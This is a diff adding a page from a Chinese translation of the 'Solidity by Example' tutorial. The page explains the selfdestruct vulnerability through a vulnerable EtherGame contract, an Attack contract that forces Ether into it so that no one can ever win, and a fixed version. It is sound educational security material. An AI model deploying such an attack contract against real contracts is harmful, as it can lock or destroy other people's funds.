@@ -1,0 +1,85 @@
+<!DOCTYPE html><html class="fa-events-icons-ready" lang="en"><head><meta charset="utf-8"><link href="/solidity-by-example-cn/favicon.ico" rel="shortcut icon"><meta content="width=device-width,initial-scale=1,shrink-to-fit=yes" name="viewport"><meta content="#000000" name="theme-color"><script src="/solidity-by-example-cn/ba3dde78ee.js"></script><link href="https://use.fontawesome.com/ba3dde78ee.css" rel="stylesheet" media="all"><link href="/solidity-by-example-cn/manifest.json" rel="manifest"><title>Self Destruct 自毁函数 | Solidity by Example 中文版 | 0.8.10</title><script src="/solidity-by-example-cn/static/js/main.cc03c517.js" defer></script><link href="/solidity-by-example-cn/static/css/main.7efd0579.css" rel="stylesheet"><link href="https://use.fontawesome.com" rel="preconnect"><meta content="An example of how to delete your smart contract by calling seldestruct in Solidity" name="Description" data-react-helmet="true"></head><body class="light"><noscript>You need to enable JavaScript to run this app.</noscript><script>const theme=localStorage.getItem("theme")||"light";document.body.classList.add(theme)</script><div id="root"><div class="App_component__uBhCy"><div class="Header_component__dJEiY"><a href="/"><img alt="logo" class="Header_logo__nZ7K6" src="/solidity-by-example-cn/static/media/logo.ed2942c41ca20fd4f70a.png"></a><h3 class="Header_header__Lhnr8"><a href="/solidity-by-example-cn/">Solidity by Example 中文版</a><div class="Header_versions__j+f36"><div class="Header_version__4Ju4J">version 0.8.10</div></div></h3><img alt="dark mode" class="Header_dark__TFGN2" src="/solidity-by-example-cn/static/media/mode-dark.5726a29b11b0940df6a4.png"></div><div class="App_main__nhgh3"><div class="Example_component__4Fiv8"><div class="Example_content__6NsNh"><h2>Self Destruct 自毁函数</h2><div><p>可以调用 <code>selfdestruct</code> 从区块链网络删除合约。</p><p><code>selfdestruct</code> 将存储在合约中的所有剩余以太币发送到指定地址</p><p>自毁合约只是给你 gas 补贴，不能给你扩大 gas 限制。</p><h3 id="vulnerability-漏洞">Vulnerability 漏洞</h3><p>A malicious contract can use <code>selfdestruct</code> to force sending Ether to any contract.</p><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.10;</span>
+
+<span class="hljs-comment">// The goal of this game is to be the 7th player to deposit 1 Ether.</span>
+<span class="hljs-comment">// Players can deposit only 1 Ether at a time.</span>
+<span class="hljs-comment">// Winner will be able to withdraw all Ether.</span>
+
+<span class="hljs-comment">/*
+1. Deploy EtherGame
+2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
+2. Deploy Attack with address of EtherGame
+3. Call Attack.attack sending 5 ether. This will break the game
+   No one can become the winner.
+
+What happened?
+Attack forced the balance of EtherGame to equal 7 ether.
+Now no one can deposit and the winner cannot be set.
+*/</span>
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherGame</span> </span>{
+    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> targetAmount <span class="hljs-operator">=</span> <span class="hljs-number">7</span> <span class="hljs-literal">ether</span>;
+    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> winner;
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
+        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>, <span class="hljs-string">"You can only send 1 Ether"</span>);
+
+        <span class="hljs-keyword">uint</span> balance <span class="hljs-operator">=</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
+        <span class="hljs-built_in">require</span>(balance <span class="hljs-operator">&lt;</span><span class="hljs-operator">=</span> targetAmount, <span class="hljs-string">"Game is over"</span>);
+
+        <span class="hljs-keyword">if</span> (balance <span class="hljs-operator">=</span><span class="hljs-operator">=</span> targetAmount) {
+            winner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
+        }
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimReward</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> winner, <span class="hljs-string">"Not winner"</span>);
+
+        (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>}(<span class="hljs-string">""</span>);
+        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
+    }
+}
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
+    EtherGame etherGame;
+
+    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">EtherGame _etherGame</span>) </span>{
+        etherGame <span class="hljs-operator">=</span> EtherGame(_etherGame);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
+        <span class="hljs-comment">// You can simply break the game by sending ether so that</span>
+        <span class="hljs-comment">// the game balance >= 7 ether</span>
+
+        <span class="hljs-comment">// cast address to payable</span>
+        <span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> addr <span class="hljs-operator">=</span> <span class="hljs-keyword">payable</span>(<span class="hljs-keyword">address</span>(etherGame));
+        <span class="hljs-built_in">selfdestruct</span>(addr);
+    }
+}
+</code></pre><h3 id="防御措施">防御措施</h3><p>不要依赖 <code>address(this).balance</code></p><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.10;</span>
+
+<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherGame</span> </span>{
+    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> targetAmount <span class="hljs-operator">=</span> <span class="hljs-number">3</span> <span class="hljs-literal">ether</span>;
+    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> balance;
+    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> winner;
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
+        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>, <span class="hljs-string">"You can only send 1 Ether"</span>);
+
+        balance <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
+        <span class="hljs-built_in">require</span>(balance <span class="hljs-operator">&lt;</span><span class="hljs-operator">=</span> targetAmount, <span class="hljs-string">"Game is over"</span>);
+
+        <span class="hljs-keyword">if</span> (balance <span class="hljs-operator">=</span><span class="hljs-operator">=</span> targetAmount) {
+            winner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
+        }
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimReward</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
+        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> winner, <span class="hljs-string">"Not winner"</span>);
+
+        (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: balance}(<span class="hljs-string">""</span>);
+        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
+    }
+}
+</code></pre></div><div class="Example_prevNext__kHIFg"><a href="/solidity-by-example-cn/hacks/overflow">&lt; Arithmetic Overflow and Underflow 算术溢出</a><a href="/solidity-by-example-cn/hacks/accessing-private-data">Accessing Private Data 访问私有数据 ></a></div><p>尝试使用 <a href="https://remix.ethereum.org" target="__blank">Remix</a></p></div></div></div><div class="App_footer__aawhi"><div class="Footer_component__jGbca"><div class="Footer_row__Rkj75"><a href="https://mhxw.life/ethereum-development-with-go-book/" target="__blank">用Go来做以太坊开发</a></div><div class="Footer_row__Rkj75"><a href="https://github.com/mhxw/solidity-by-example-cn" target="__blank">源码</a><div class="Footer_bar__yDFRF">|</div><a href="https://github.com/mhxw/solidity-by-example-cn/blob/dev/LICENSE" target="__blank">License</a></div></div></div></div></div></body></html>
